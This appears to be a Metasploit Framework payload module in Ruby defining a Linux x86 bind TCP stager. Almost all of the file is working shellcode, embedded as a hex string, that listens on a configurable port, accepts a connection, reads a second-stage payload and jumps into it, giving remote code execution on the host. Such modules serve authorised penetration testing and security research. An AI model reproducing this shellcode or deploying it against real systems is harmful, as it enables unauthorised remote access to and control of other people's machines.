##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'


###
#
# BindTcp
# -------
#
# Linux bind TCP stager.
#
###
module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Linux

  def self.handler_type_alias
    "bind_nonx_tcp"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Bind TCP Stager',
      'Description'   => 'Listen for a connection',
      'Author'        => 'skape',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::BindTcp,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LPORT' => [ 0x14, 'n'    ],
            },
          'Payload' =>
            "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96" +
            "\x43\x52\x66\x68\xbf\xbf\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56" +
            "\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1" +
            "\xb0\x66\xcd\x80\x93\xb6\x0c\xb0\x03\xcd\x80\x89\xdf\xff\xe1"
        }
      ))
  end

end
